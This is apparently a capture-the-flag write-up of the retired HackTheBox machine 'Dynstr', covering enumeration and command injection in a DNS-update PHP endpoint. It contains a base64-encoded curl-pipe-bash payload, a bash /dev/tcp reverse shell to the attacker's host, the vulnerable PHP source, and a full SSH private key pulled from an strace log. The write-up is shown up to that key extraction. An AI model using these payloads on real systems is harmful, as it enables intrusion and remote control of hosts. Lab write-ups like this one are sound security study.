---
Category: B2R
Difficulty: Medium
Platform: HackTheBox
Retired: true
Status: 3. Complete
Tags:
  - DDNS
  - cp-privesc
  - insecure-credentials
  - insecure-file-permissions
  - nsupdate
  - parameter-injection
  - php-code-injection
  - Linux
---
# Resolution summary

>[!summary]
>- The web application **disclosed** some **credentials** and sub-domains other then other useful information about their API
>- Looking at the **no-ip API** it was possible to authenticate to the web app API using the disclosed credentials and find a **command injection vulnerability**
>- Enumerating an **strace** output file it was possible to discover a **ssh key** for the bindmgr user. Because the access was denied except for authentication coming from ***.infra.dyna.htb**, a custom subdomain was added using **nsupdate** and access was obtained
>- bindmgr was allowed to execute a custom script with high privileges which turned to be vulnerable to **parameter injection**. Abusing this issue it was possible to escalate to root

## Improved skills

- Exploit command injection bypassing filters
- Manage DNS with nsupdate
- Exploit parameter injection caused by the insecure use of wildcards

## Used tools

- nmap
- gobuster
- burpsuite

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ sudo nmap -p- -sS -oN scans/all-tcp-ports.txt -v 10.10.10.244
...
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ sudo nmap -p80,53,22 -sT -sV -sC -oN scans/open-tcp-ports.txt 10.10.10.244
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
```

Enumerated top 200 UDP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ sudo nmap --top-ports 200 -sU -oN scans/top200-udp-ports.txt 10.10.10.244
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 06:05 EDT
Nmap scan report for 10.10.10.244
Host is up (0.050s latency).
Not shown: 153 closed ports, 46 open|filtered ports
PORT   STATE SERVICE
53/udp open  domain
```

# Enumeration

## Port 80 - HTTP

![Pasted image 20210619120846.png](../../zzz_res/attachments/Pasted_image_20210619120846.png)

Enumerated email:

![Pasted image 20210619121211.png](../../zzz_res/attachments/Pasted_image_20210619121211.png)

Enumerated credetìntials:

![Pasted image 20210619121154.png](../../zzz_res/attachments/Pasted_image_20210619121154.png)

>[!important]
>dynadns     sndanyd

Enumerated sub-domains:

![Pasted image 20210619121237.png](../../zzz_res/attachments/Pasted_image_20210619121237.png)

Other info:

>[!info]
> We are providing dynamic DNS for anyone with the same API as no-ip.com has. Maintaining API conformance helps make clients work properly.
> - [https://www.noip.com/it-IT/integrate/request](https://www.noip.com/it-IT/integrate/request)
> - [https://www.noip.com/integrate/response](https://www.noip.com/integrate/response)

Enumerated files and directories:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ gobuster dir -u http://10.10.10.244 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25 -o scans/p80-directories.txt
...
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.244/assets/]
/server-status        (Status: 403) [Size: 277]
/nic                  (Status: 301) [Size: 310] [--> http://10.10.10.244/nic/]

┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ gobuster dir -u http://10.10.10.244/nic/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 25
...
/update               (Status: 200) [Size: 8]
```

![Pasted image 20210626132950.png](../../zzz_res/attachments/Pasted_image_20210626132950.png)

**/nic/update** change configurations:

```
GET /nic/update?hostname=dnsalias.htb&myip=10.10.14.5 HTTP/1.1
Host: 10.10.10.244
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic
```

![Pasted image 20210626133800.png](../../zzz_res/attachments/Pasted_image_20210626133800.png)

![Pasted image 20210626140712.png](../../zzz_res/attachments/Pasted_image_20210626140712.png)

# Exploitation

## Command Injection

API were vulnerable to command injection:

![Pasted image 20210626154109.png](../../zzz_res/attachments/Pasted_image_20210626154109.png)

![Pasted image 20210626154142.png](../../zzz_res/attachments/Pasted_image_20210626154142.png)

Reverse shell:

![Dots were considered as part of the domain](../../zzz_res/attachments/Pasted_image_20210626154836.png)

Dots were considered as part of the domain

Generated a payload to bypass the regex:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ echo -n 'curl 10.10.14.5/rev.sh | bash' | base64
Y3VybCAxMC4xMC4xNC41L3Jldi5zaCB8IGJhc2g=

┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
```

Hosted the reverse shell:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ nano rev.sh
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/10099 0>&1'

┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

HTTP request:

```bash
GET /nic/update?myip=10.10.10.244&hostname=$(echo+Y3VybCAxMC4xMC4xNC41L3Jldi5zaCB8IGJhc2g=+|+base64+-d+|+bash).dnsalias.htb&myipv6=1 HTTP/1.1
Host: 10.10.10.244
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic ZHluYWRuczpzbmRhbnlk
```

![Pasted image 20210626155511.png](../../zzz_res/attachments/Pasted_image_20210626155511.png)

![Pasted image 20210626155620.png](../../zzz_res/attachments/Pasted_image_20210626155620.png)

Upgrade the shell:

```bash
www-data@dynstr:/var/www/html/nic$ which python
which python
www-data@dynstr:/var/www/html/nic$ which python3
which python3
/usr/bin/python3
www-data@dynstr:/var/www/html/nic$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<nic$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@dynstr:/var/www/html/nic$ ^Z
zsh: suspended  nc -nlvp 10099

┌──(kali㉿kali)-[~/CTFs/HTB/box/dynstr]
└─$ stty raw -echo; fg                                                                                  148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 10099

www-data@dynstr:/var/www/html/nic$ export TERM=xterm
www-data@dynstr:/var/www/html/nic$
```

Vulnerable code:

```php
<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
?>
```

# Lateral Movement to bindmgr

## Enumeration

Enumerated local users:

```bash
www-data@dynstr:/var/www/html/nic$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash
bindmgr:x:1001:1001::/home/bindmgr:/bin/bash

www-data@dynstr:/home/dyna$ ls -al
total 24
drwxr-xr-x 3 dyna dyna 4096 Mar 18 20:00 .
drwxr-xr-x 4 root root 4096 Mar 15 20:26 ..
lrwxrwxrwx 1 dyna dyna    9 Mar 18 20:00 .bash_history -> /dev/null
-rw-r--r-- 1 dyna dyna  220 Mar 15 20:01 .bash_logout
-rw-r--r-- 1 dyna dyna 3771 Mar 15 20:01 .bashrc
drwx------ 2 dyna dyna 4096 Mar 15 20:01 .cache
-rw-r--r-- 1 dyna dyna  807 Mar 15 20:01 .profile
-rw-r--r-- 1 dyna dyna    0 Mar 15 20:02 .sudo_as_admin_successful
www-data@dynstr:/home/dyna$ cd ..
www-data@dynstr:/home$ ls
bindmgr  dyna
www-data@dynstr:/home$ cd bindmgr/
www-data@dynstr:/home/bindmgr$ ls
support-case-C62796521  user.txt
www-data@dynstr:/home/bindmgr$ ls -al
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Jun 26 13:31 user.txt
```

Network info:

```bash
www-data@dynstr:/etc/bind$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       dyna dynstr

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### bindmgs/.ssh

Discovered a filtered DDNS allowed to login using SSH keys:

```bash
www-data@dynstr:/home/bindmgr/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
www-data@dynstr:/home/bindmgr/.ssh$ ls -al
total 24
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts
www-data@dynstr:/home/bindmgr/.ssh$ cat authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

support-case:

```bash
www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -al
total 436
drwxr-xr-x 2 bindmgr bindmgr   4096 Mar 13 14:53 .
drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt

www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat command-output-C62796521.txt
* Expire in 0 ms for 6 (transfer 0x56090d2d1fb0)
* Expire in 1 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 0 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 2 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 0 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 0 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 2 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 0 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 1 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 2 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 1 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 1 ms for 1 (transfer 0x56090d2d1fb0)
* Expire in 2 ms for 1 (transfer 0x56090d2d1fb0)
*   Trying 192.168.178.27...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x56090d2d1fb0)
* Connected to sftp.infra.dyna.htb (192.168.178.27) port 22 (#0)
* SSH MD5 fingerprint: c1c2d07855aa0f80005de88d254a6db8
* SSH authentication methods available: publickey,password
* Using SSH public key file '/home/bindmgr/.ssh/id_rsa.pub'
* Using SSH private key file '/home/bindmgr/.ssh/id_rsa'
* SSH public key authentication failed: Callback returned error
* Failure connecting to agent
* Authentication failure
* Closing connection 0
```

Disclosed a private key inside the strace log:

```bash
www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt | grep -i ssh
15123 execve("/usr/bin/curl", ["curl", "-v", "-sk", "sftp://bindmgr@sftp.infra.dyna.htb/bindmgr-release.zip", "--pubkey", "/home/bindmgr/.ssh/id_rsa.pub"], 0x7ffdfdef1ba8 /* 14 vars */) = 0
15123 openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libssh2.so.1", O_RDONLY|O_CLOEXEC) = 3
15123 sendto(3, "SSH-2.0-libssh2_1.8.0\r\n", 23, MSG_NOSIGNAL, NULL, 0) = 23
15123 sendto(3, "\0\0\2\344\n\24\310\252X\241\374+\312\327\233\375\376\33\2529\325\240\0\0\0~diffie-hellman-group-exchange-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1\0\0\0\17ssh-rsa,ssh-dss\0\0\0\222aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\0\0\0\222aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\0\0\0qhmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\0\0\0qhmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\0\0\0\4none\0\0\0\4none\0\0\0\0\0\0\0\0\0\0\0\0\0i\35\274su$\"\nF\24", 744, MSG_NOSIGNAL, NULL, 0) = 744
15123 recvfrom(3, "\0\0\0044\6\24\225\346`9\223h\360\310i\242\322\304\4\25\320X\0\0\1\2curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1\0\0\0Arsa-sha2-512,rsa-sha2-256,ssh-rsa,ecdsa-sha2-nistp256,ssh-ed25519\0\0\0lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\0\0\0lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\0\0\0\325umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\0\0\0\325umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\0\0\0\25none,zlib@openssh.com\0\0\0\25none,zlib@openssh.com\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 16384, MSG_NOSIGNAL, NULL, NULL) = 1080
15123 recvfrom(3, "\0\0\3<\10!\0\0\1\27\0\0\0\7ssh-rsa\0\0\0\3\1\0\1\0\0\1\1\0\322\n=J@\313\350\312,'s,\5c0\351\32dX\273Z\n\222Z\362\3637\211\31?\3712\332v\37em\200\324\264-GH\253\300`31dtW\204\314N/\327\350\205\304\7\256\177S\254B\351\376\10\236bqF\326>@\263\274hx\315\302Nu\177\360'\272\356\225\2030\322V\261\37d\301\307\224,\17\3645\240R\256\251\16\222\215MR\314 \3053%\334\243P\350\274M\205\366\366|=\237\267\17\345\7\260\322c\323j\253WpwS\265\n\325\363\223\177\235\nI\365t\336\211t4L\343n\30\37\371\211\336O?\4#\370\324Q\276\25\241|\222\306jM\361qz\203t\341.\337C\350X\26\205\v\333z\277k@c\210c'%\361\332\234\346V\32\310\17[\250GOZ\315~\27\352|\341-\334\3438[\335\233\243\324\233Q\306Xv)\36qb\324)\26\5\335\256\347*\275\357\373]*=\0\0\1\0j\v\373\201\23c\18s\237\232:]\243\342\250y\221\tB\332q\243\344\3652?\316\346\246\10\260\0253D\2\36\250(`\3033\324\375\326\2526\344?Q\3\\\3\330\276\362\323\334\254%u+!\331/\31r\267[\3349\373\25\226\3051!6\3\324Z\325\2650K\5h\245\0231\377\205\251\245\26\211q\26\327\334\22\373\255GE\231\f\265>\263i&\320Xl\3\rn\235\355W;,\277\221F\2751C\220\25540\307!\364\350>vv\20&\201\273\376\234I\215,d\v\3509n<\24[2?\207n\317\372>\3607\370P2?!\337\10\254L\270m\231\30\262^b=\240o\220\337?\372\216?\3469\337\273\v\276w\204\332\10\357 P\323\354 \205\251v`\250\242g\336 \227\371\v|Z\377\317\224#I\342\356\353\375\300\27BPN\356p\320\37\\\325C\317Df\241\2305\204\2051\310\326gny\0\0\1\17\0\0\0\7ssh-rsa\0\0\1\0\212\231\2046>\333\rJ\353\310k\360\v\6\307\2175I<\233\330]\372\306\35\333\200\32\336!\v7;\332\200n\20\363\226W\tM\203\3009-\364\20\234\7\377/B\370Pxl\261\266\246\\SWP}\353\262\20 d\306\344\275,\202\0\n:\264\206\210\t\376|\305\17\327\301\235\350/\222n_\314\31\303{Y\212$..\271\221J\320\215*\22\270iK\251l_\250\263\374&\353\237\nr\35\227\247\265l\314!{\277\333\332O#\321k'\212\34\335$\355\255\272\373\34Q\320/\252\245jl4m\373\242eoo\2626\267\210\225\177\363MtzO\233[\264v%y\337\362\202:\307\330N\313m\303zVS\203!MV/=\211e\360\240>\376b\340\323\251\352z\206i\330U\245\274\201={bw\317\254\337\3,\251\351h\307\200\232\344\357\33\301\32\341\252g'\266\221\352\237]R\312L\233T\355;\315\r\0\0\0\0\0\0\0\0\0\0\0\f\n\25\0\0\0\0\0\0\0\0\0\0", 16384, MSG_NOSIGNAL, NULL, NULL) = 848
15123 write(2, "SSH MD5 fingerprint: c1c2d07855aa0f80005de88d254a6db8\n", 54) = 54
15123 write(2, "SSH authentication methods available: publickey,password\n", 57) = 57
15123 access("/home/bindmgr/.ssh/id_rsa", R_OK) = 0
15123 write(2, "Using SSH public key file '/home/bindmgr/.ssh/id_rsa.pub'\n", 58) = 58
15123 write(2, "Using SSH private key file '/home/bindmgr/.ssh/id_rsa'\n", 55) = 55
15123 openat(AT_FDCWD, "/home/bindmgr/.ssh/id_rsa.pub", O_RDONLY) = 5
15123 read(5, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen\n", 4096) = 395
15123 read(5, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen\n", 4096) = 395
15123 openat(AT_FDCWD, "/home/bindmgr/.ssh/id_rsa", O_RDONLY) = 5
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV
```

Extracted and formatted the private key:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/dynstr/loot]
└─$ cat key| sed 's/\\n/\n/g'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

┌──(kali㉿kali)-[~/…/HTB/box/dynstr/loot]
